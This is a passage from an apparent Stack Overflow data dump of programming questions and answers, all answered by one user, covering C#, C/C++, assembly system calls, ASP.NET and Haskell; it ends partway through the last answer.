<p>The Operators ""<code>+</code>"" and ""<code>*</code>"" can also be used.  This is not mentioned in the ANSI C++ Spec, but probably works because of the same reason as above.  ""<code>+</code>"" give ""or"" because true is converted to 1, and then anything other than 0 is converted back to true.  ""<code>*</code>"" works for ""and"" because 1 (true) * 0 (false) == 0(false) and 1(true) * 1(true) == 1(true)</p>

<p>Both of these seem to rely on implicit type conversion to integer and then back to bool.  Both of these will likely mess up whomever tries to maintain the code.</p>

<p>Other responses boil down to ""Just use temporaries"" or ""Implement your own"" which was not the question.  The goal was to see if there was already an operator implemented in the C++ standard to do it.</p>
","33708","","<p>The <code>&amp;</code> operator performs logical ""and"" operation for <code>bool</code> operands and is not short circuited.</p>

<p>It's not a sequence point. You cannot rely on the order of evaluation of the operands. However, it's guaranteed that both operands are evaluated.</p>

<p><em>I do <strong>not</strong> recommend doing this. Using temporary variables is a better solution. Don't sacrifice readability for ""clever code"".</em></p>
"
"<p>I want to parse a string into a type easily, but I don't want to write wrapper code for each type, I just want to be able to do ""1234"".Parse() or the like and have it return 1234. This should work for any type that has parsing capabilities.</p>
","33708","","<p>This trick should work. It uses the type of the variable you're assigning to automagically:</p>

<pre><code>public static class StringExtensions {
    public static ParsedString Parse(this string s) {
        return new ParsedString(s);
    }
}
public class ParsedString {
    string str;
    public ParsedString(string s) {
        str = s;
    }
    public static implicit operator int(ParsedString s) {
        return int.Parse(s.str);
    }
    public static implicit operator double(ParsedString s) {
        return double.Parse(s.str);
    }
    public static implicit operator short(ParsedString s) {
        return short.Parse(s.str);
    }
    public static implicit operator byte(ParsedString s) {
        return byte.Parse(s.str);
    }
    // ... add other supported types ...
}
</code></pre>

<p>Usage:</p>

<pre><code>int p = ""1234"".Parse();
</code></pre>

<p>I would prefer explicitly parsing using framework provided methods rather than relying on these kind of tricks.</p>
"
"<p>I was reading <a href=""http://rads.stackoverflow.com/amzn/click/020161622X"" rel=""nofollow"">The Pragmatic Programmer</a> last night and it recommends learning a whole host of languages as you go through your career - even if you'll never use them. I'd always thought this would be a good idea, but the book has given me enough impetus to think about it seriously.</p>

<p>It also mentions (words to the effect of) ""learn object oriented design and you'll code pure C programs differently"".</p>

<p>I could go and (re)learn Java, but it seems perhaps an easy option given it's a language that follows a lot of the same principles as C#. I will probably still (re)learn Java at some point, but I'm quite interested first of all in what languages would be sufficiently different in their pattern of thinking that I would learn a different perspective - or just a whole different way of thinking about how to code a program.</p>

<p>Functional programming perhaps? Any suggestions are welcome, but please try and provide a short reasoning as to why they might be interesting and ""new"" from a C# user's perspective.</p>
","33708","","<p>I suggest learning F#. You are already familiar with the .NET Framework so you don't have to deal with it. You can focus on the language and learn functional programming ideas. </p>

<p>Most likely, if you switch back to C#, you'll see yourself doing many stuff in functional style and will be more productive in that language too.</p>
"
"<p>I dont understand why var m does not return Match. I havent checked but it seems to be returning an object.</p>

<pre><code>        foreach (var m in Regex.Matches(""dummy text"", ""(mm)""))
            var sz = m.Groups[1]; // error CS1061: 'object' does not contain a definition for 'Groups' and no extension method 'Groups' accepting a first argument of type 'object' could be found (are you missing a using directive or an assembly reference?)

        foreach (Match m in Regex.Matches(""dummy text"", ""(mm)""))
            var sz = m.Groups[1]; //ok
</code></pre>
","33708","","<p><code>var</code> <strong>infers</strong> the type of the variable at <em>compile time</em> from the type of the expression it's initialized to. <code>Matches</code> returns <code>MatchCollection</code> which implements the old school <code>IEnumerable</code> and not the generic <code>IEnumerable&lt;Match&gt;</code>. The type of the <code>Current</code> property returned by the enumerator returned from <code>IEnumerable.GetEnumerator()</code> is <code>object</code>. Thus, <code>var</code> will infer the type of <code>m</code> to be <code>object</code> and not <code>Match</code>.</p>

<p>When you explicitly specify the type in a <code>foreach</code> statement and the return type of the enumerator differs, the compiler will silently insert a cast instruction to make that work. No other compile time check can be performed in that case and it will throw an <code>InvalidCastException</code> at run time in case it fails. </p>
"
"<p>I'm working on some serialization routines, and I need a way to get the type of an input array. </p>

<p>Let's say I have the following object:</p>

<pre><code>class myclass {
    public int foo;
    public byte[] bar;
}
</code></pre>

<p>Now I can get the type of <code>myclass.foo</code> by using <code>GetType()</code>. And if I say that ""<code>myclass.bar = new byte[0]</code>"", I can infer that <code>bar</code> is an array of bytes by using <code>GetElementType()</code>, <code>HasElementType</code>, and <code>IsArray</code>.</p>

<p>However if I never set <code>bar</code> and just leave it as <code>null</code>, I can't find a way to get the type info off the object. If I do <code>myclass.foo.GetType()</code> all I get is a null value.</p>

<p>Is there anyway to infer the type of ""bar"" in this case?</p>
","33708","","<p>A nonexistent object doesn't have a type. It doesn't make sense to get the type of a <code>null</code> reference. What you are looking for is actually the type of the field. You can get that by reflecting over the type <em>declaring</em> the field (in this case, <code>myclass</code>).</p>
"
"<p>I understand <strong><em>indexer enable us to access a collection within a class as though the class
itself were an array</em></strong>.</p>

<p>Suppose we are developing a project ,where do we fit the real pratical usage (example may help) of such indexers ?</p>
","33708","","<p>Suppose you are developing Microsoft .NET Framework for other developers to use (which is really a ""real-world project""). You need to write a class that acts like an array but supports getting resized dynamically (the <code>List&lt;T&gt;</code> class). Without an indexer, you could write two methods to get and set elements:</p>

<pre><code>public T get(int index) { ... }
public void set(int index, T value) { ... }
// (Java advocates: no offense intended)
</code></pre>

<p>Assume a user of your library wants to increment the second element. She'll have to write:</p>

<pre><code>list.set(1, list.get(1) + 1);
</code></pre>

<p>With an indexer, the syntax is much simpler, more readable, and easier to understand:</p>

<pre><code>list[1]++;
</code></pre>

<p>(similar arguments apply to things like <code>Dictionary&lt;TKey,TValue&gt;</code>...)</p>
"
"<p>I know that you are supposed to use <code>0</code> instead of NULL in c++ (even though <code>NULL</code> is defined as <code>0</code> in C++ most of the time).</p>

<p>Recently I came across some code where <code>0x0</code> was used instead, though.</p>

<p>What is the difference?</p>
","33708","","<p><code>0x0</code> is just <code>0</code> written in hexadecimal notation. There is no difference between the two:</p>

<blockquote>
  <p>0<sub>16</sub> = 0<sub>10</sub> :)</p>
</blockquote>

<p><code>NULL</code> is usually <code>#define</code>d to <code>0</code> somewhere and does the same thing.</p>
"
"<p>Is there any way to optionally return a null with a ""return yield"" driven iterator?</p>

<p>I would like to return a null in some cases and I don't think this is particular to IEnumerable of type string. Same goes for IEnumerable of type int etc. Thanks</p>

<pre><code>static void Main(string[] args)
{
    var Items = GetItems();

    if (Items != null)
    {
        foreach (var item in Items)
        {
            Console.WriteLine(item);
        }
    }
    else
    {
        Console.WriteLine(""&lt;null&gt;"");
    }
}

static IEnumerable&lt;string&gt; GetItems()
{
    if (false)
    {
        yield return ""Andy"";
        yield return ""Jennifer"";
    }

    return null; // &lt;- Compiler Error:
    // Cannot return a value from an iterator. 
    // Use the yield return statement to return a value,
    // or yield break to end the iteration.
}
</code></pre>
","33708","","<p>If you need to things like that (or throw things like <code>ArgumentException</code> immediately), you need to separate your iterator into two methods:</p>

<pre><code> public IEnumerable&lt;string&gt; GetItems() {
     if (something) return null;
     return GetItemsInternal();
 }

 private IEnumerable&lt;string&gt; GetItemsInternal() {
     // the actual iterator with ""yield return"" goes here.
 }
</code></pre>
"
"<p>Will all .NET languages support operator overloading or C# and managed C++  only support it?</p>
","33708","","<p>The Common Language Specification does not enforce any rules in this regard on conforming languages. They should be able to use overloaded operators in various ways (either the language supports it or you'll do the method call yourself). A language is free to choose whether or not it should provide the ability to declare overloaded operators.</p>
"
"<p>So I have the following program:</p>

<pre><code>int main(){
  char* one = ""computer"";
  char two[] = ""another"";
  two[1]='b';
  one[1]='b';
  return 0;
}
</code></pre>

<p>It segfaults on the line ""one[1]='b'"" which makes sense because the memory that the pointer ""one"" points to must be in read only memory. However, the question is why doesn't the line ""two[1]='b'"" segfault? Looking at the assembly output from gcc:</p>

<pre><code>.file   ""one.c""
        .section        .rodata
.LC0:
        .string ""computer""
.LC1:
        .string ""another""
        .text
.globl main
        .type   main, @function
main:
</code></pre>

<p>We see that both strings are in the rodata section so they are readonly. So then how come the line ""two[1]='b' does not segfault?</p>
","33708","","<p><code>one</code> points directly to the string located in a read-only page. On the other hand, <code>two</code> is an array allocated on the stack and is initialized with some constant data. At run time, the string in the read only section of the executable will be copied to the stack. What you are modifying is the copy of that string on the stack, not the read-only memory page.</p>

<p>At a higher level perspective, from the language point of view, <code>""abcd""</code> is an expression of type <code>const char*</code> and not <code>char*</code>. Thus, modifying the value pointed by such an expression results in undefined behavior. The statement <code>char* one = ""something"";</code> merely stores the pointer to the string in a variable (unsafely, since it's casting away <code>const</code> modifier). The <code>char two[] = ""something"";</code> is totally different. It's actually declaring an array and initializing it, much like <code>int a[] = {1,2,3};</code>. The string in quotes here is the initialization expression.</p>
"
"<p>I have a date string in format ""08/1999"" I want to get the first date of the corresponding month. eg : in this case 08/01/1999. 
It is simple for en-Us culture. I break the string, append ""01"" in the string to get 08/01/1999 and then DateTime.Parse(datestring) but this is valid for en-US culture only. </p>

<p>How can I do this for different culture ? </p>

<p>My datestring will always be in mm/yyyy format. and I am trying to obtain a DataTime obj from this dateString.  </p>
","33708","","<p>I'm not sure if I understand your question correctly, but you can try passing <code>CultureInfo.InvariantCulture</code> if you want to force the US date format regardless of the regional settings of the client computer:</p>

<pre><code>DateTime.Parse(""08/1999"", System.Globalization.CultureInfo.InvariantCulture)
</code></pre>
"
"<p>Im having a bit of trouble understanding the more complex system calls in assembly.  I wrote a exec system call and it worked great</p>

<pre><code> .bss

.text

.globl _start

_start:

#exit(0) system call

        movl $1, %rax
        movl $0, %rbx
        int $0X80
</code></pre>

<p>Though I am a bit insure and have not been able to find info pertaining to how you put strings in a register.  So as an example I wanted to do a exec system call and it as its first parameter needs a filename to run and I want to run ""/bin/bash"", but how do I get that in rbx.  How do I even know that I have to use rbx, in X86 I know I would use ebx, is it the same relationship in amd64  ebx=rbx, ecx=rcs, etc.</p>

<p>int execve(const char *filename, char *const argv[],
char *const envp[]); </p>

<p>Thanks all</p>
","33708","","<p>You don't put strings in a register. You should pass a pointer (the address) to a null (0) terminated string (C style) in the register for this function. Some system calls (like <code>write</code>) take a pointer (not necessarily terminated by <code>'\0'</code>) and length in two registers. </p>

<pre><code># somewhere in the data section:
myString:
   .asciz ""/bin/bash""
</code></pre>

<p>and pass <code>$myString</code> using the register.</p>
"
"<p>Now that it's public knowledge that App Store submissions are being tested for use of private APIs, I need to ask the question... what exactly is a private API so that I may avoid them?</p>
","33708","","<p>A private API is an API that is not documented in the SDK. For instance, a framework class might declare a method that is not intended to be used by outside developers. The behavior of a private API is not guaranteed. You can't even be sure that the method will be there in the future updates of the platform. Its declaration is probably not available in publicly distributed SDK header files. If you stick to things publicly defined in the SDK documentation, you'll be OK.</p>
"
"<p>I need to mess around with the stacks on these architecture and am really a n00b here. Any pointers to reading topics/google searches that i can do. I am looking for how these architectures are fundamentally different from each other. something more than the wikipedia article on this topic <a href=""http://en.wikipedia.org/wiki/X64"">http://en.wikipedia.org/wiki/X64</a></p>
","33708","","<p>I believe the Wikipedia article you linked to provides a reasonable amount of introductory information. If you are interested in the specific details of differences in Long Mode, you can consult one of the official references: <a href=""http://www.intel.com/products/processor/manuals/"" rel=""nofollow"">IntelÂ® 64 and IA-32 Architectures Software Developer's Manuals</a>.</p>
"
"<p>i have the following code inside a static method in a static class</p>

<pre><code>Random r = new Random();
int randomNumber = r.Next(1,100);
</code></pre>

<p>i have this inside a loop and i keep getting the same randomNumber?</p>

<p>any suggestions here?</p>
","33708","","<p>You should not create a new <code>Random</code> instance in a loop. Try something like:</p>

<pre><code>var rnd = new Random();
for(int i = 0; i &lt; 100; ++i) 
   Console.WriteLine(rnd.Next(1, 100));
</code></pre>

<p>The sequence of random numbers generated by a single <code>Random</code> instance is supposed to be uniformly distributed. By creating a new <code>Random</code> instance for every random number in quick successions, you are likely to seed them with identical values and have them generate identical random numbers. Of course, in this case, the generated sequence will be far from uniform distribution.</p>

<p>For the sake of completeness, if you really need to reseed a <code>Random</code>, you'll create a new instance of <code>Random</code> with the new seed:</p>

<pre><code>rnd = new Random(newSeed);
</code></pre>
"
"<pre><code>ALTER TABLE Physician 
Modify (RefLastName nvarchar(500),
RefFirstName nvarchar(500));
</code></pre>

<p>Getting Incorrect syntax error...</p>
","33708","","<p>The way you use <a href=""http://msdn.microsoft.com/en-us/library/ms190273.aspx"" rel=""nofollow""><code>ALTER TABLE</code></a> is not like <code>CREATE TABLE</code>. You mention changes to the table elements rather than specifying all columns from scratch. Like:</p>

<pre><code>ALTER TABLE TableName
ADD LastName NVARCHAR(100) NOT NULL
</code></pre>
"
"<p>I just installed Visual Studio 2010 Beta 2 on my hard drive. I also reinstalled MVC Beta 2.</p>

<p>I opened then my solution in VS2010 and I got the error message ""The project type is not supported by this installation"". I don't really understand since, first I upgraded from MVC1 to MVC2 in Visual Studio 2008 and today I tried to convert it to 2010.</p>

<p>Any idea where would be the problem ?</p>
","33708","","<p>VS2010 ships with ASP.NET MVC 2 Preview 2. ASP.NET MVC 2 Beta is <a href=""http://haacked.com/archive/2009/11/17/asp.net-mvc-2-beta-released.aspx"" rel=""nofollow"">not supported on VS2010</a>.</p>
"
"<p>When writing this: </p>

<pre><code>1: inline double f( double arg ) {
2:    return arg == 0.0 ? 0.0 : 1./arg;
3: }
4: const double d = f( 0.0 );
</code></pre>

<p>The microsoft visual studio 2005 64-bit compiler came with</p>

<pre><code>line 4: warning C4723: potential divide by 0
</code></pre>

<p>While you and I can clearly see that a div-by-zero is <em>never</em> going to happen... </p>

<p>Or is it?</p>
","33708","","<p>The compiler is not able to statically analyze all code paths and take into account all possibilities all the time. Theoretically, complete analysis of a program behavior just by looking into its source code can provide a solution to halting problem, which is undecidable. Compilers have a limited set of static analysis rules to detect rules. The C++ standard does not require the compiler to issue such kind of warnings, so, no. It's not a bug. It's more like a nonexistent feature.</p>
"
"<p>I have a <code>foreach</code> loop like below</p>

<pre><code>        foreach (XYZ split in this.splits )
        {
            // this code is inserted for debug purpose only
            bool check = object.ReferenceEquals(splits.First(), split);
            .....
        }
</code></pre>

<p>When I have single element in <code>this.splits</code>, check is returning false. I have checked by some other way, check is always returning false. Any idea why this is happening?</p>
","33708","","<p>Depends on the way the enumerator is implemented. The implementation is free to return a copy or the object itself. In fact, it can return whatever it likes; for instance, <code>Enumerable.Range</code> returns a sequence of numbers and none of the elements are actually stored anywhere. They are generated on the fly. If the return type is a value-type, it's certainly a copy of something.</p>

<p>Also, nothing requires the object to return the same sequence each time <code>GetEnumerator</code> is called on it. In your code example, it does it once in <code>foreach</code> and another time when you call <code>.First</code>. These sequences are not required to be equivalent.</p>
"
"<p>i am working in embedded C environment.. can we pass function pointer as an argument to a function in C? if so, can u give me a sample declaration and definition.. thnx in advance</p>
","33708","","<p>Definitely.</p>

<pre><code>void f(void (*a)()) {
    a();
}

void test() {
    printf(""hello world\n"");
}

int main() {
     f(&amp;test);
     return 0;
}
</code></pre>
"
"<p>I'm a complete begginer with Linq. And I woild like to know, if it is possible to make a query where for a given Class1.Code I get matching Class2.Value.</p>

<pre><code>class Class1()
{
    public string Code;
    ...
}

class Class2()
{
    public double Value;
    ...
}

SortedList&lt;Class1, Class2&gt;
</code></pre>

<p>Thank you for your help.</p>
","33708","","<pre><code>list.First(x =&gt; x.Key.Code == codeToSearch).Value
</code></pre>

<p>However, this is not efficient (O(n)). I guess this is not the correct way to approach the problem. If you are searching by <code>Code</code> most of the time, you should probably make it a <code>SortedList&lt;string, Class2&gt;</code> and store <code>Code</code> as the key.</p>
"
"<p>Simple scenario:
I have a signup form, with user name, password, email address, may be credit card number.</p>

<p>At the bottom of the page, I implement the Google Analytics code.<br>
when user clicks submit, it goes to a page wihtout google analytics.</p>

<p>question is..
can GA get the data (user naem, password..email..etc) in the first form after user input the data?</p>

<p>Do they say anything about it in their TOS or Privacy policy?</p>
","33708","","<p>Yes. I recommend against putting any third party script on sensitive pages secured by SSL. It's not likely that Google is going to hijack sensitive data on your page but you should take into account the possibility that a malicious ISP can hijack the request (say, using DNS) to Google Analytics script and do whatever it wants on your page.</p>
"
"<p>I wrote some code that looks similar to the following:</p>

<pre><code>String SKIP_FIRST = ""foo"";
String SKIP_SECOND = ""foo/bar"";

int skipFooBarIndex(String[] list){
    int index;
    if (list.length &gt;= (index = 1) &amp;&amp; list[0].equals(SKIP_FIRST) ||
        list.length &gt;= (index = 2) &amp;&amp; 
        (list[0] + ""/"" + list[1]).equals(SKIP_SECOND)){
        return index;
    }

    return 0;
}

String[] myArray = ""foo/bar/apples/peaches/cherries"".split(""/"");
print(skipFooBarIndex(myArray);
</code></pre>

<p>This changes state inside of the if statement by assigning index. However, my coworkers disliked this very much.</p>

<p>Is this a harmful practice? Is there any reason to do it?</p>
","33708","","<p>Yes. This clearly reduces readability. What's wrong with the following code?</p>

<pre><code>int skipFooBarIndex(String[] list){
    if(list.length &gt;= 1 &amp;&amp; list[0].equals(SKIP_FIRST)) 
        return 1;
    if(list.length &gt;= 2 &amp;&amp; (list[0] + ""/"" + list[1]).equals(SKIP_SECOND))
        return 2;
    return 0;
}
</code></pre>

<p>It's much easier to understand. In general, having side effects in expressions is discouraged as you'll be relying on the order of evaluation of subexpressions.</p>

<p>Assuming you count it as ""clever"" code, it's good to always remember Brian Kernighan's quote:</p>

<blockquote>
  <p>Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it.</p>
</blockquote>
"
"<p>I wish to create shareware software that contains a registration algorithm.  I am looking for a programming language, that cannot be easily decompiled into readable code.  For example, C# can be decompiled into readable code.</p>

<p>What are my options?</p>

<p>Edit: I'm looking for something that can be only decompiled into assembly. Delphi, for example, cannot be decompiled like C# or Java, but from what I've heard, Delphi is dying.</p>
","33708","","<p>If your CPU is able to see the code and run it, by definition, a sufficiently talented person can do it too.</p>

<p>You can, however, make it harder by running your code through an obfuscator.</p>
"
"<p>I'm trying to do this, but it doesn't work. Some suggestions?</p>

<pre><code>int test_i = 0;
DoSomethingThatTakesAgesAndNeedsToUpdateUiWhenFinished(test_i);
test_i &lt;- still is 0 and not 3!!!

public void DoSomethingThatTakesAgesAndNeedsToUpdateUiWhenFinished(int i)
{
    DisableUi();
    m_commandExecutor.ExecuteWithContinuation(
                () =&gt;
                    {
                        // this is the long-running bit
                        ConnectToServer();
                        i = 3; &lt;-------------------------- 
                        // This is the continuation that will be run
                        // on the UI thread
                        return () =&gt;
                                    {
                                        EnableUi();
                                    };
                    });
}
</code></pre>

<p>Why I can't set test_i to 3? I also tried ref and out, but it doesn't work.</p>

<p>What can I do to fix it?</p>

<p><strong>EDIT</strong></p>

<p>I've tried this, but ouside of this method dataSet still is empty.</p>

<pre><code>public static void Select(DataGridView dataGridView, ref DataSet dataSet, params object[] parameters)
  {
     var _dataSet = dataSet;
     AsyncCommandExecutor commandExecutor = new AsyncCommandExecutor(System.Threading.SynchronizationContext.Current);
     commandExecutor.ExecuteWithContinuation(
     () =&gt;
     {
        // this is the long-running bit
        _dataSet = getDataFromDb(parameters);

        // This is the continuation that will be run on the UI thread
        return () =&gt;
        {
           dataGridView.DataSource = _dataSet.Tables[0].DefaultView;
        };
     });
     dataSet = _dataSet;
  }
</code></pre>
","33708","","<p>The <code>i</code> variable in the lambda expression refers to the parameter <code>i</code> of the method. As a workaround, you can make it to refer to a global variable (dirty solution).</p>

<p>By the way, <a href=""http://stackoverflow.com/questions/1365689/cannot-use-ref-or-out-parameter-in-lambda-expressions/1365698#1365698"">you can't capture <code>ref</code> and <code>out</code> variables in lambdas</a>, but you can have them as parameters. You need to change the signature of your delegate and the implementation of the method receiving the delegate, which might not be suitable:</p>

<pre><code>(out int i) =&gt; { i = 10; }
</code></pre>
"
"<pre><code>Sphere() : theRadius(1.0)
{
}
</code></pre>

<p>Why is it preferable to have a constructor written with initializers (above) than a constructor that initializes the data members within its body (below)?</p>

<pre><code>Sphere()
{
     theRadius = 1.0;
}
</code></pre>
","33708","","<p>If you don't initialize fields explicitly, the compiler will try to run the default constructor of them. If they don't have an accessible default constructor, your source code will fail to compile:</p>

<pre><code>class Field {
public:
    Field(int x) {}
};
class Test {
    Field f;
public: 
    Test() {  // compiler error here. `Field` doesn't have default constructor.
       f = Field(10); 
    } 
};
int main ( ) {
    Test t;
}
</code></pre>

<p>If they do have a default constructor, you're calling it unnecessarily as you're calling another constructor of the field in the body.</p>
"
"<p>Does anyone has the P/Invoke declaration of the CONTEXT struct defined in the WinNT.h file?</p>

<p>Thanks.</p>
","33708","","<p><a href=""http://pinvoke.net/"" rel=""nofollow"">PInvoke.NET</a> is a free Visual Studio plugin that inserts P/Invoke signatures automatically.</p>

<p>Another useful tool is <a href=""http://www.codeplex.com/clrinterop"" rel=""nofollow"">P/Invoke Interop Assistant</a>.</p>
"
"<p>I want insert "":"" between 2 dropdownlist in a cell.</p>

<pre><code>tableCell.Controls.Add(DropDownListOraInizio);            
tableCell.Controls.Add(DropDownListMinutoInizio);
</code></pre>

<p>How can i do?</p>

<p>thanks</p>
","33708","","<pre><code>tableCell.Controls.Add(DropDownListOraInizio);    
tableCell.Controls.Add(new LiteralControl("":""));      
tableCell.Controls.Add(DropDownListMinutoInizio);
</code></pre>
"
"<p>I'm new to splitting up my applications into multiple solutions (in other words I just got into the real world), I have a situation where I'm fully seperating the logic from the UI into a seperate project. Where I'm falling down is my glue code.</p>

<p>As a simple example.</p>

<p>Project car references projects containing door,radio etc</p>

<p>Project garage references project car, but needs to use radio.</p>

<p>Do I need to add a reference to the radio project in the garage project?</p>
","33708","","<p>Yes, you'll need to add a reference to both libraries. In general, you need to add a reference to all libraries declaring types you <em>directly</em> use; by declaring variables of those types, inheriting from them, using methods that has the type as parameters or return type, etc.</p>
"
"<p>Should an ASP.NET MVC Developer start to learn Silverlight either?</p>
","33708","","<p>ASP.NET MVC is a server side framework, Silverlight runs on the client. While they can work together in a single application, they are meant to do very different things. It's not necessary to know Silverlight to use ASP.NET MVC.</p>

<p>If you need to create mixed applications with Silverlight on the client and ASP.NET MVC on the server, you'll need to know Silverlight.</p>
"
"<p>I am working on a ASP .NET mVC project &amp; i have to change HttpHeaders. see the foolowing code snippet:</p>

<pre><code>WebRequest req= HttpWebRequest.Create(""myURL"");
HttpWebResponse response = (HttpWebResponse)request.GetResponse();

req.Headers.Add(""User-Agent"", ""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 (.NET CLR 3.5.30729)"");
req.Headers.Add(""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"");
req.Headers.Add(""Accept-Language"", ""en-us,en;q=0.5"");
</code></pre>

<p>this gives  a exception i.e.</p>

<blockquote>
  <p>This header must be modified using the appropriate property.\r\nParameter name: name.</p>
</blockquote>

<p>Anyone suggets solution for it</p>
","33708","","<p>You should set header values that have a corresponding property in the object through the property. For instance, <a href=""http://msdn.microsoft.com/en-us/library/system.net.httpwebrequest.useragent.aspx"" rel=""nofollow"">UserAgent</a> property is provided to set the user agent. You should modify the header with:</p>

<pre><code>req.UserAgent = ""Mozilla/5.0 ..."";
</code></pre>

<p>Of course, you should set header values before calling <code>GetResponse</code>.</p>
"
"<p>I beheld quite a few usage of ""function!"" in others vimrc files, but there is no easy-to-find documentation of ""function!"".</p>

<p>What's the difference between ""function"" and ""function!""?</p>
","33708","","<p>In general, it suppresses the messages the command may spit out.</p>

<p>For instance, using <code>function!</code>, you can redeclare an already defined function.</p>
"
"<p>Whatâs the difference between an <a href=""http://meyerweb.com/eric/tools/dencoder/"">URL Encode</a> and a <a href=""http://www.opinionatedgeek.com/dotnet/tools/htmlencode/Encode.aspx"">HTML Encode</a>?  </p>
","33708","","<p>HTML Encoding escapes special characters in strings used in HTML documents to prevent confusion with HTML elements like changing</p>

<pre><code>""&lt;hello&gt;world&lt;/hello&gt;""
</code></pre>

<p>to</p>

<pre><code>""&amp;lt;hello&amp;gt;world&amp;lt;/hello&amp;gt;""
</code></pre>

<p>URL Encoding does a similar thing for string values in a URL like changing</p>

<pre><code>""hello+world = hello world""
</code></pre>

<p>to</p>

<pre><code>""hello%2Bworld+%3D+hello+world""
</code></pre>
"
"<p>It doesn't seem to do squat for the following test program. Is this because I'm testing with a small list?</p>

<pre><code>static void Main(string[] args)
{
    List&lt;int&gt; list = 0.UpTo(4);

    Test(list.AsParallel());
    Test(list);
}

private static void Test(IEnumerable&lt;int&gt; input)
{
    var timer = new Stopwatch();
    timer.Start();
    var size = input.Count();
    if (input.Where(IsOdd).Count() != size / 2)
        throw new Exception(""Failed to count the odds"");

    timer.Stop();
    Console.WriteLine(""Tested "" + size + "" numbers in "" + timer.Elapsed.TotalSeconds + "" seconds"");
}

private static bool IsOdd(int n)
{
    Thread.Sleep(1000);
    return n%2 == 1;
}
</code></pre>

<p>Both versions take 4 seconds to run.</p>
","33708","","<p>Task Parallel Library cares about the <em>static type</em> of the sequence. It should be <code>IParallelEnumerable&lt;T&gt;</code> for the operations to be handled by the TPL. You are casting the collection back to <code>IEnumerable&lt;T&gt;</code> when you call <code>Test</code>. Therefore, the compiler will resolve <code>.Where</code> call on the sequence to <code>System.Linq.Enumerable.Where</code> extension method instead of the parallel version provided by the TPL.</p>
"
"<p>Basically i want to know if the visual studio IDE and/or compiler in 2010 and 2012 was <em>written</em> to make use of a multi core environment (i understand we can target multi core environments in all versions using parallelism, but that is not my question).</p>

<p>I am trying to decide on if i should get a higher clock dual core or a lower clock quad core, as i want to try and figure out which processor will give me the absolute best possible experience with Visual Studio 2010 or 2012 (v11) (ide and background compiler).</p>

<p>If they are running the most important section (background compiler and other ide tasks) in one core, then the core will get cut off quicker if running a quad core, especially if background compiler is the heaviest task, i would imagine this would be difficult to separate in more than one process, so even if it uses multi cores you might still be better off going for a higher clock CPU if the majority of the processing is still bound to occur in one core (i.e. the most significant part of the VS environment).</p>

<p>I am a VB programmer, they've made great performance improvements in 2010 and 2012, congrats (except for the horrid grey scale design and the uppercase everywhere), but I would love to be able to use VS seamlessly... anyone have any ideas? Also, I'm not too worried about solution load time, as I only code one project at a time.</p>

<p>Thanks.</p>
","33708","","<p>MSBuild supports building projects in parallel. Visual Studio 2008 takes advantage of multiple processors to <a href=""http://msdn.microsoft.com/en-us/library/bb383805.aspx"">compile projects</a>.</p>
"
"<pre><code>public class Fruit
{
    // choose one
    public int Id { get; set; }
    public int FruitId  get; set; } // redundant or usefully more descriptive?

    // choose one
    public string Name { get; set; }
    public string FruitName { get; set;} // redundant or usefully more descriptive?
    public string Fruit { get; set; } // or what about this?
}
</code></pre>

<p>Which is your preferred convention for the fruit's identification number and name? Why? Are there other examples where you would answer differently?</p>
","33708","","<p>In my opinion, almost always, <code>Id</code> and <code>Name</code> are preferred and redundantly specifying the class name is not recommended. However, a notable exception is when <code>Id</code> or <code>Name</code> refer to an internal identifier or name and <code>FruitNumber</code> and <code>FruitName</code> refer to ""real world identifier"" or ""display name"" of the entity and for some reason you don't want to name it <code>DisplayName</code>.</p>
"
"<p>I have a structure something like this</p>

<pre><code>struct MyStructure
    :IFoo
{
}
</code></pre>

<p>and a method like this:</p>

<pre><code>public BarThisFoo(IFoo a)
{

}
</code></pre>

<p>my question is does passing the structure into that method ""box"" the structure, thus causing a garbage allocation?</p>

<p>Addendum:
Before anyone says it, garbage collection is not free in this application, it's actually very sensitive to garbage collections, so allocation free code is important.</p>
","33708","","<p>Yes. Casting a value type to an interface type it conforms to will box the value. Boxing operation is required in order to treat the value type as an object. It adds the necessary headers (incl. vtable) to the value so that you can call interface methods on it. A boxed value is subject to garbage collection as any managed object.</p>
"
"<p>I understand that:</p>

<pre><code>head (map (2**) [1..999999])
</code></pre>

<p>Will only actually evaluate 2**1, and none of the rest, but the book I am reading says that:</p>

<pre><code>head (sort somelist)
</code></pre>

<p>Will only need to find the smallest item in the list, because that is all that is used. How does this work? As far as I can tell, this would be impossible with the sorting algorithms I know (like bubble sorting).</p>

<p>The only way I can think that this would work is if the sorting algorithm were to go through the entire list looking for the smallest item, and then recurse on the list without that item. To me, this sounds really slow.</p>

<p>Is this how the sort function works, or is there another sorting algorithm I don't know about, that would allow for short circuiting like it is?</p>
","33708","","<p>The algorithm you just described has a specific name: ""selection sort"". It's O(n<sup>2</sup>) so it's not quite the fastest thing you could do. However, if you want the first ""k"" elements in the sorted array, the complexity would be O(kn) which is nice if ""k"" is small enough (like your example).</p>

<p>Note that you are using a pure function in a functional language. The compiler is likely to be able to generate optimized code for <code>sort</code> in both cases by looking at the way functions are composed. It can easily infer that you want the minimum element when you compose <code>head</code> and <code>sort</code>.</p>
"
"<pre><code>Dim project = new Project(1)
Dim tasks = Task.GetTasks()
Return &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
               &lt;Project xmlns=""http://schemas.microsoft.com/project""&gt;
                   &lt;Name&gt;&lt;%= project.name %&gt;&lt;/Name&gt;
                   &lt;Tasks&gt;
                       &lt;%= tasks.Select(Function(t) _
                           &lt;Task&gt;
                               &lt;ID&gt;&lt;%= tasks.IndexOf(t) + 1 %&gt;&lt;/ID&gt;                               
                           &lt;/Task&gt; _
                           ) %&gt;
                   &lt;/Tasks&gt;
               &lt;/Project&gt;
</code></pre>

<p>I am trying to replace <code> tasks.IndexOf(t) + 1</code> with something a little simpler. Is there any built in functionality for this?</p>

<p>Hrmm xml literals do not seem to translate well on here....</p>
","33708","","<p>There's an overload for <code>Enumerable.Select</code> that supports passing an index along with the object itself. You can use that one:</p>

<pre><code>Dim project = new Project(1)
Dim tasks = Task.GetTasks()
Return &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
               &lt;Project xmlns=""http://schemas.microsoft.com/project""&gt;
                   &lt;Name&gt;&lt;%= project.name %&gt;&lt;/Name&gt;
                   &lt;Tasks&gt;
                       &lt;%= tasks.Select(Function(t, idx) _
